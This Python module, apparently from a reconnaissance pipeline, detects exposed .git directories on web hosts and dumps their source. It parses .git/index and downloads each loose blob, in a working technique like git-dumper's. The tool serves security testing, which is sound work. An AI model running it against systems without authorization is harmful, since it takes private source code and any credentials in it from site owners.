"""gitdump — reconstruct source from a confirmed ``.git`` exposure.

Every other high-value-target category in this pipeline stops at
"confirmed exposed" (``sensitive_ext.py`` probes ``.git/HEAD``/``.git/config``
and a 200 is the whole finding). For git that is only the front door: the
actual source is one binary file away.

The technique (the same one git-dumper/GitTools use) skips walking the
commit -> tree -> blob graph entirely, because on any host that ever ran
``git gc`` the loose objects a tree-walk needs are packed away and
unreachable via plain HTTP. ``.git/index`` — the file describing the
CURRENT WORKING TREE — lists every tracked path together with its blob
SHA1 directly, and index files routinely survive ``git gc`` (a repack
touches ``objects/``, not ``index``). Fetch it once, then fetch each blob
straight from ``.git/objects/<sha[:2]>/<sha[2:]>``.

Verified empirically against a real local repo (this docstring is not
describing the format from memory): the binary index layout, the 8-byte
padded entry stride, and the loose-object ``"blob <size>\\0<content>"``
zlib envelope were all round-tripped by hand before this parser was
written, including confirming that ``git gc`` deletes the loose object
files a bare tree-walk would need — which is exactly why the index-based
approach is used instead.

Best-effort throughout: a packed/missing blob is skipped and counted, never
treated as a hard failure — partial source recovery is still a real
finding.
"""
from __future__ import annotations

import re
import struct
import zlib
from pathlib import Path
from typing import Optional
from urllib.parse import urlsplit

import requests

from . import console, layout, runner
from .utils import load_json, make_result, raw_dir, read_lines, write_json, write_lines

_HEAD_REF_RE = re.compile(r"^ref:\s*refs/", re.IGNORECASE)
_HEAD_SHA_RE = re.compile(r"^[0-9a-f]{40}$", re.IGNORECASE)


def looks_like_git_head(body: str) -> bool:
    """True when *body* is a real ``.git/HEAD`` (not a 200-with-index.html
    catch-all wearing the same status code)."""
    b = (body or "").strip()
    return bool(_HEAD_REF_RE.match(b) or _HEAD_SHA_RE.match(b))


def sanitize_host(url: str) -> str:
    """``https://x.example.com:8443`` -> ``x.example.com_8443`` — a
    filesystem-safe directory name, collision-free across scheme/port."""
    p = urlsplit(url)
    host = f"{p.hostname or 'host'}" + (f"_{p.port}" if p.port else "")
    return re.sub(r"[^a-zA-Z0-9._-]", "_", host)


# ----------------------------------------------------------------------
# .git/index parser — see module docstring for how this was verified.
# ----------------------------------------------------------------------
def parse_index(data: bytes) -> list[tuple[str, str]]:
    """Return ``[(path, sha1_hex), …]`` from a raw ``.git/index`` file.

    Returns ``[]`` (never raises) on anything that doesn't start with the
    ``DIRC`` signature — a host that 200s something other than a real
    index (e.g. an SPA catch-all) must not be misread as an empty repo.
    """
    if len(data) < 12 or data[:4] != b"DIRC":
        return []
    _sig, _version, count = struct.unpack(">4sII", data[:12])
    entries: list[tuple[str, str]] = []
    off = 12
    for _ in range(count):
        start = off
        if off + 62 > len(data):
            break
        sha1 = data[off + 40:off + 60]
        flags = struct.unpack(">H", data[off + 60:off + 62])[0]
        name_len = flags & 0x0FFF
        name_start = off + 62
        if name_len < 0x0FFF:
            name_end = name_start + name_len
        else:
            nul = data.find(b"\x00", name_start)
            if nul == -1:
                break
            name_end = nul
        name = data[name_start:name_end]
        try:
            entries.append((name.decode("utf-8", errors="replace"), sha1.hex()))
        except Exception:  # noqa: BLE001 — a malformed entry shouldn't kill the rest
            pass
        # Entries are NUL-padded to a multiple of 8 bytes from `start`.
        entry_len = name_end - start
        padded_len = ((entry_len + 8) // 8) * 8
        off = start + padded_len
    return entries


def parse_blob(raw_zlib: bytes) -> Optional[bytes]:
    """Inflate a loose object and strip its ``"<type> <size>\\0"`` header.

    Returns ``None`` on anything that doesn't decompress or doesn't carry
    the expected header — a non-git 404 page fetched by mistake must not
    be written to disk as if it were real blob content.
    """
    try:
        data = zlib.decompress(raw_zlib)
    except zlib.error:
        return None
    header, sep, content = data.partition(b"\x00")
    if not sep or not header.startswith(b"blob "):
        return None
    return content


# ----------------------------------------------------------------------
# Stage 1 — confirm exposure across alive hosts (batched via httpx CLI).
# ----------------------------------------------------------------------
def _confirm(hosts: list[str], output_dir: Path, g_cfg: dict) -> list[str]:
    import json
    raw = raw_dir(output_dir, "gitdump")
    in_file = raw / "head_candidates.txt"
    out_file = raw / "head_probe.jsonl"
    candidates = [h.rstrip("/") + "/.git/HEAD" for h in hosts]
    write_lines(in_file, candidates)
    if out_file.exists():
        out_file.unlink()

    cmd = [
        "httpx", "-l", str(in_file),
        "-json", "-silent", "-irr", "-duc", "-mc", "200",
        "-threads", str(int(g_cfg.get("threads", 30))),
        "-timeout", str(int(g_cfg.get("http_timeout", 10))),
        "-retries", "1",
        "-o", str(out_file),
    ]
    runner.run(cmd, stage="gitdump", output_dir=output_dir,
              timeout=int(g_cfg.get("timeout", 900)))

    confirmed: list[str] = []
    if not out_file.exists():
        return confirmed
    for line in out_file.read_text(encoding="utf-8", errors="ignore").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            row = json.loads(line)
        except (ValueError, TypeError):
            continue
        url = row.get("url") or ""
        if url.endswith("/.git/HEAD") and looks_like_git_head(row.get("body") or ""):
            confirmed.append(url[: -len("/.git/HEAD")])
    return confirmed


# ----------------------------------------------------------------------
# Stage 2 — dump one host's working tree via .git/index + loose objects.
# ----------------------------------------------------------------------
def dump_host(host: str, dest: Path, max_files: int,
              timeout: int = 10) -> dict:
    """Best-effort source recovery for one confirmed host.

    Returns a summary dict — never raises. Every network/parse failure
    just reduces ``files_recovered``, since a partial dump is still real.
    """
    dest.mkdir(parents=True, exist_ok=True)
    summary = {"host": host, "files_in_index": 0, "files_recovered": 0,
              "files_skipped": 0, "ref": None}

    try:
        r = requests.get(host.rstrip("/") + "/.git/HEAD", timeout=timeout)
        if r.status_code == 200:
            summary["ref"] = r.text.strip()
    except requests.RequestException:
        pass

    try:
        r = requests.get(host.rstrip("/") + "/.git/index", timeout=timeout)
    except requests.RequestException:
        return summary
    if r.status_code != 200:
        return summary

    entries = parse_index(r.content)
    summary["files_in_index"] = len(entries)
    if max_files and len(entries) > max_files:
        entries = entries[:max_files]

    for path, sha1 in entries:
        obj_url = f"{host.rstrip('/')}/.git/objects/{sha1[:2]}/{sha1[2:]}"
        try:
            obj = requests.get(obj_url, timeout=timeout)
        except requests.RequestException:
            summary["files_skipped"] += 1
            continue
        if obj.status_code != 200:
            summary["files_skipped"] += 1     # packed away by `git gc` — expected
            continue
        content = parse_blob(obj.content)
        if content is None:
            summary["files_skipped"] += 1
            continue
        out_path = dest / path
        try:
            out_path.parent.mkdir(parents=True, exist_ok=True)
            out_path.write_bytes(content)
            summary["files_recovered"] += 1
        except OSError:
            summary["files_skipped"] += 1

    return summary


def _outputs_exist(json_out: Path) -> bool:
    return json_out.exists() and json_out.stat().st_size > 0


def discover(
    alive_file: Path,
    output_dir: Path,
    cfg: dict,
    *,
    resume: bool = False,
    dry_run: bool = False,
    skip: bool = False,
) -> dict:
    stage = "gitdump"
    layout.ensure_tree(output_dir)
    findings = output_dir / "findings"
    findings.mkdir(parents=True, exist_ok=True)
    json_out = findings / "git_dump.json"
    outputs = [json_out]

    g_cfg = (cfg.get("gitdump") or {}) if isinstance(cfg, dict) else {}

    if skip:
        write_json(json_out, {"hosts": []})
        return make_result(stage, "skipped", input_path=alive_file,
                           outputs=outputs, count=0, error="--skip-gitdump")
    if not g_cfg.get("enabled", False):
        write_json(json_out, {"hosts": []})
        return make_result(stage, "skipped", input_path=alive_file,
                           outputs=outputs, count=0,
                           error="disabled in config (opt-in: gitdump.enabled)")
    if resume and _outputs_exist(json_out):
        existing = load_json(json_out) or {}
        hosts_done = existing.get("hosts", []) if isinstance(existing, dict) else []
        return make_result(stage, "success", input_path=alive_file,
                           outputs=outputs,
                           count=sum(h.get("files_recovered", 0) for h in hosts_done))
    if dry_run:
        return make_result(stage, "skipped", input_path=alive_file,
                           outputs=outputs, count=0, error="dry-run")
    if not runner.tool_available("httpx"):
        return make_result(stage, "skipped", input_path=alive_file,
                           outputs=outputs, count=0, error="httpx binary not found")

    hosts = read_lines(alive_file)
    max_hosts = int(g_cfg.get("max_hosts", 50) or 0)
    capped = 0
    if max_hosts and len(hosts) > max_hosts:
        capped = len(hosts) - max_hosts
        hosts = hosts[:max_hosts]
    if not hosts:
        write_json(json_out, {"hosts": []})
        return make_result(stage, "success", input_path=alive_file,
                           outputs=outputs, count=0, error="no alive hosts")

    confirmed = _confirm(hosts, output_dir, g_cfg)
    if not confirmed:
        write_json(json_out, {"hosts": []})
        return make_result(stage, "success", input_path=alive_file,
                           outputs=outputs, count=0,
                           error="no confirmed .git/HEAD exposure on any alive host",
                           extra={"hosts_probed": len(hosts), "hosts_capped": capped})

    dump_root = raw_dir(output_dir, "gitdump") / "repos"
    max_files = int(g_cfg.get("max_files_per_host", 2000) or 0)
    http_timeout = int(g_cfg.get("http_timeout", 10))

    host_summaries = []
    total_recovered = 0
    for host in confirmed:
        dest = dump_root / sanitize_host(host)
        summary = dump_host(host, dest, max_files, timeout=http_timeout)
        summary["output_dir"] = str(dest)
        host_summaries.append(summary)
        total_recovered += summary["files_recovered"]
        print(console.phase_info_line(
            f"[{stage}] {host}: {summary['files_recovered']}/"
            f"{summary['files_in_index']} file(s) recovered → {dest}"))

    write_json(json_out, {"hosts": host_summaries})

    return make_result(
        stage, "success", input_path=alive_file, outputs=outputs,
        count=total_recovered,
        extra={"hosts_confirmed": len(confirmed), "hosts_capped": capped,
              "hosts_probed": len(hosts)},
    )
